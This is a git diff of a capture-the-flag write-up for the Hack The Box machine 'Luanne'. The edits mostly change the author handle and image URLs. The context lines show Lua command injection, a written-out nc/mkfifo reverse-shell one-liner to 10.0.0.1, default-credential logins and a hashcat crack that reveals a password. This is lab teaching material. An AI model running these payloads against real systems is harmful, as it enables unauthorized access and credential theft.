@@ -9,6 +9,7 @@ avatar: assets/htb/luanne.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Luanne
 ---
+
 ## Useful Skills and Tools
 
 ### Decrypt `.enc` file in BSD
@@ -33,7 +34,7 @@ doas whoami
 I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves all types of output \(.nmap,.gnmap, and .xml\) with filenames of `<name>`.
 
 ```bash
-┌──(zweilos㉿kali)-[~/htb/luanne]
+┌──(kac0㉿kali)-[~/htb/luanne]
 └─$ nmap -sCV -n -p- -Pn -v -oA luanne <YOUR_IP>
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-18 19:09 EDT
@@ -74,39 +75,39 @@ Nmap only showed three ports were open on this machine: 22- SSH, 80 - HTTP, and 
 
 I started out my enumeration by navigating to `<YOUR_IP>` in my browser.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-unauth.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-unauth.png)
 
 I was immediately greeted by a Basic HTTP authorization prompt.  Since I didn't have any credentials I tried a few basic defaults, but no luck.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-index.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-index.png)
 
 Navigating to `/index.html` brought me to a default `nginx` installation page.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-robots.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-robots.png)
 
 There was only one disallow line in `robots.txt` that showed a directory called `/weather`. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-weather.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-weather.png)
 
 This did not reveal anything interesting, however.  I left `dirbuster` running while I checked out the next service.  I searched for exploits related to this version of `nginx` but only found a few denial of service vulnerabilities and a CNAME leakage.  There was nothing useful.
 
 ### Port 9001 - HTTP
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-9001.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-9001.png)
 
 Navigating to the page hosted on port 9001 also gave me a Basic HTTP authentication prompt.  However, this one gave me a little clue.  I did some research on the Supervisor process manager, looking for default credentials after seeing the hint of  "default".
 
 * [https://readthedocs.org/projects/supervisor/downloads/pdf/latest/](https://readthedocs.org/projects/supervisor/downloads/pdf/latest/)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-default.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-default.png)
 
 default seemed to be user:123 from the manual \(though it specifies none:none\)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/6-supervisor-status.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-supervisor-status.png)
 
 after logging in I had a supervisor-status page that showed what appeared to be running processes on the server
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/7.5-processes.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7.5-processes.png)
 
 ```bash
 USER         PID %CPU %MEM    VSZ   RSS TTY   STAT STARTED    TIME COMMAND
@@ -135,35 +136,35 @@ root         433  0.0  0.0  19784  1584 ttyE3 Is+  10:22AM 0:00.00 /usr/libexec/
 
 I saw a cron in the process output, as well as a weather.lua
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-no-exec.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-no-exec.png)
 
 I tried checking for local file inclusion and code execution vulnerabilities but they just gave errors.
 
 ### Port 80 - `/weather/forecast/`
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/9.5-weather-forecast.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9.5-weather-forecast.png)
 
 I found a directory `/weather/forecast/` using Dirbuster.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/9-weather-forecast.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-weather-forecast.png)
 
 "No city specified. Use 'city=list' to list available cities."
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-weather-test.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-weather-test.png)
 
 'test' showed unknown city error
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-lua-error.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-lua-error.png)
 
 Sending a query of `'` \(single quote\) resulted in a "nil value" Lua error.  I expected to test for a SQL injection vulnerability, but got something else instead.  I did some reading on Lua syntax to see if I could figure out how to get this to execute code.
 
 * [https://www.lua.org/manual/5.1/manual.html](https://www.lua.org/manual/5.1/manual.html)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/12-noscript-xss-warning.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/12-noscript-xss-warning.png)
 
 My first attempt triggered a warning from NoScript about a possible XSS attack.  I had to close off the function parameters with `')`, separate the commands with a `;`, and use a Lua comment `--` at the end closed off the insertion to get this warning.  I still did not get code execution however.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/12-lua-code-exec.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/12-lua-code-exec.png)
 
  Looking a bit closer at my attempt, I noticed that I had typed `os.system('id')` rather than `os.execute('id')` which NoScript saw as JavaScript, triggering that warning.  Fixing this error allowed me to get command execution. 
 
@@ -214,19 +215,19 @@ The command `uname -a` revealed this to be a NetBSD system.  I wasn't sure what 
 
 > `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f`
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/13-reverse-shell.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/13-reverse-shell.png)
 
 I found a reverse shell with nc \(without -e\) for openbsd, and hoped that it would work for this distro as well.  The response hung for awhile after sending, which was a good sign.
 
 ## Initial Foothold
 
 ```bash
-┌──(zweilos㉿kali)-[~/htb/luanne]
+┌──(kac0㉿kali)-[~/htb/luanne]
 └─$ script luanne-init  
 Script started, output log file is 'luanne-init'.
-┌──(zweilos㉿kali)-[~/htb/luanne]
+┌──(kac0㉿kali)-[~/htb/luanne]
 └─$ bash
-zweilos@kali:~/htb/luanne$ nc -lvnp 4242
+kac0@kali:~/htb/luanne$ nc -lvnp 4242
 listening on [any] 4242 ...
 connect to [10.10.14.187] from (UNKNOWN) [<YOUR_IP>] 54839
 sh: can't access tty; job control turned off
@@ -263,7 +264,7 @@ webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
 found an MD5 hash in `.htpasswd`
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/luanne]
+┌──(kac0㉿kali)-[~/htb/luanne]
 └─$ hashcat -O -D1,2 -a0 -m500 hash /usr/share/wordlists/rockyou.txt --username
 hashcat (v6.1.1) starting...
 
@@ -312,11 +313,11 @@ Stopped: Sat Mar 27 20:11:48 2021
 
 It cracked within seconds to reveal the password `iamthebest`.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/14-webapi.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/14-webapi.png)
 
 I was able to use this to log into the other web portal on port 80.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/15-webapi.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/15-webapi.png)
 
 There did not seem to be anything further I could do here other than discover the `/weather/forecast/` endpoint I had already used to gain access to the machine.
 
@@ -592,8 +593,8 @@ I was finally able to get it by removing the specification for curl to interpret
 ### User.txt
 
 ```text
-zweilos@kali:~/htb/luanne$ chmod 600 r.michaels.key 
-zweilos@kali:~/htb/luanne$ ssh -i r.michaels.key r.michaels@<YOUR_IP>
+kac0@kali:~/htb/luanne$ chmod 600 r.michaels.key 
+kac0@kali:~/htb/luanne$ ssh -i r.michaels.key r.michaels@<YOUR_IP>
 Last login: Sat Mar 27 21:16:20 2021 from 10.10.14.220
 NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020
 
@@ -618,7 +619,7 @@ dr-xr-x---  4 r.michaels  users   512 Sep 16  2020 devel
 dr-x------  2 r.michaels  users   512 Sep 16  2020 public_html
 -r--------  1 r.michaels  users    33 Sep 16  2020 user.txt
 luanne$ cat user.txt
-ea5f****ebc0
+ea5f************************ebc0
 ```
 
 got the user.txt flag
@@ -809,10 +810,10 @@ httpd.register_handler('forecast', forecast)
 Nothing useful here? There did seem to be a backdoor potentially written in, though it was commented out `-- city=London') os.execute('id') --`. I think this is where I injected my original access
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/luanne]
+┌──(kac0㉿kali)-[~/htb/luanne]
 └─$ echo 'webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.' >> hash                                130 ⨯
 
-┌──(zweilos㉿kali)-[~/htb/luanne]
+┌──(kac0㉿kali)-[~/htb/luanne]
 └─$ hashcat -O -D1,2 -a0 -m500 hash /usr/share/wordlists/rockyou.txt --username
 hashcat (v6.1.1) starting...
 
@@ -889,7 +890,7 @@ drwxr-xr-x  21 root  wheel   512 Sep 16  2020 ..
 # cat root      
 cat: root: No such file or directory
 # cat root.txt
-7a9b****5f66
+7a9b************************5f66
 # cat cleanup.sh
 #!/bin/sh
 
